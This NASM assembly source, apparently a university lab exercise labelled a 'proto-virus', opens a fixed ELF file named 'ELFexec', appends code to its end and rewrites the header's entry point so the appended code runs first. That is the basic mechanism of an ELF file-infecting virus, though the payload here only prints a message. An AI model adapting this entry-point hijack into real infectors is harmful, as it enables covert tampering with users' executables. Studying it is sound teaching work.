%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDOUT 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define FD dword [ebp-4]
%define ELF_header ebp-56
%define FIleSize dword [ebp-60]
%define original_entry_point ebp-64


	global _start

	section .text
_start:	
	push	ebp ;backup EBP
	mov	ebp, esp ;Set ebp to Func activation frame
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

    open FileName,RDWR, 0x777 ; open the file
    mov FD, eax		;save the file descriptor

    lea ecx, [ELF_header]  ; make ecx to point to ELF_header buffer pointer
    read FD,ecx,52 ; read 52 bytes from the start of the file to ecx (ELF_header buffer)
    cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes of the file to ".ELF"
    jne cmp_error ; if not ELF file
    lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file
    mov FIleSize, eax					;return the size of the file
    mov edx, print_OutStr_end - print_OutStr
    write FD, print_OutStr, edx

.modify_entry_point:
    lseek FD, 0 ,SEEK_SET				;set the file pointer to the end of the file
    mov eax, dword [ELF_header+ENTRY]   ;sets eax to point to the entry point location in the buffer
    mov dword [original_entry_point], eax 	;saving original entry point
    mov eax, 0x8048000                  ;sets eax to the the physical location of the process image
    add eax, FIleSize                   ;adds the fileSize of the original file
    mov dword [ELF_header+ENTRY], eax   ;sets the entry point address in the buffer to the end file in ram
    lea ecx, [ELF_header]               ;set ecx to the address of the modified header buffer
    write FD,ecx,52					    ;write the modified header back to the file

    ;.update_return_address:
    ;lseek FD,-4,SEEK_END					;modifying the last 4 bytes which hold the return address
    ;lea ecx, [original_entry_point]
    ;write FD, ecx, 4
    ;lseek FD,0,SEEK_SET

    .close_the_modified_file:
    close FD

    exit 0


print_OutStr:
    write STDOUT, OutStr, 32
    exit 0
print_OutStr_end:



VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
cmp_error: ;if the file is not ELF type
    write STDOUT, Failstr, 13
    exit -1

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:

